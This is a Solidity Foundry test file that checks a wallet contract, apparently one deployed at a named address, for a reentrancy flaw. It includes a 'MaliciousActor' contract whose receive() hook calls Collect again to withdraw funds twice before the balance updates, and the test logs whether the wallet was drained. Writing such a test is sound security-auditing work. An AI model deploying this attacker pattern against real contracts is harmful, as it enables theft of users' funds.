// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract WalletReentrancyTest is Test {
    WALLET public wallet;
    Log public logContract;
    MaliciousActor public attacker;
    uint256 constant DEPOSIT = 1 ether;
    uint256 constant WITHDRAWAL_AMOUNT = 0.5 ether;
    
    function setUp() public {
        // Deploy contracts
        logContract = new Log();
        wallet = new WALLET(address(logContract));
        attacker = new MaliciousActor(wallet);
        
        // Fund attacker contract
        vm.deal(address(attacker), DEPOSIT);
        
        // Deposit funds into wallet
        vm.prank(address(attacker));
        wallet.Put{value: DEPOSIT}(0);
    }

    function testReentrancyVulnerability() public {
        // Advance time to pass unlockTime
        vm.warp(block.timestamp + 1 days);
        
        // Pre-attack state verification
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        (uint256 attackerInternalBefore,) = wallet.Acc(address(attacker));
        
        console.log("--- BEFORE-Trigger attack ---");
        console.log("Wallet ETH balance:                     ", walletBalanceBefore);
        console.log("Attacker ETH balance:                   ", attackerBalanceBefore);
        console.log("Attacker internal balance in wallet:    ", attackerInternalBefore);
        
        console.log("--- Trigger attack ---");
        attacker.attack(WITHDRAWAL_AMOUNT);
        
        // Post-attack state verification
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        (uint256 attackerInternalAfter,) = wallet.Acc(address(attacker));
        
        console.log("--- AFTER-Trigger attack ---");
        console.log("Wallet ETH balance:                     ", walletBalanceAfter);
        console.log("Attacker ETH balance:                   ", attackerBalanceAfter);
        console.log("Attacker internal balance in wallet:    ", attackerInternalAfter);

        // Differential verification
        bool fundsDrained = walletBalanceAfter == 0;
        bool attackerStoleFunds = attackerBalanceAfter == DEPOSIT;
        bool internalBalanceCorrupted = attackerInternalAfter != 0;
        
        // Vulnerability determination
        if (fundsDrained && attackerStoleFunds && internalBalanceCorrupted) {
            console.log("Vulnerability Exists: Reentrancy allows multiple withdrawals before balance update");
        } else {
            console.log("Vulnerability not Exist: Contract correctly handles withdrawals with reentrancy protection");
        }
    }
}

contract MaliciousActor {
    WALLET public wallet;
    uint256 depth;
    uint256 attackAmount;
    uint256 private constant MAX_DEPTH = 2;
    
    constructor(WALLET _wallet) {
        wallet = _wallet;
    }
    
    function attack(uint256 amount) public {
        depth = 0;
        attackAmount = amount;
        wallet.Collect(attackAmount);
    }

    receive() external payable {
        if (++depth < MAX_DEPTH) {
            wallet.Collect(attackAmount);
        }
    }
}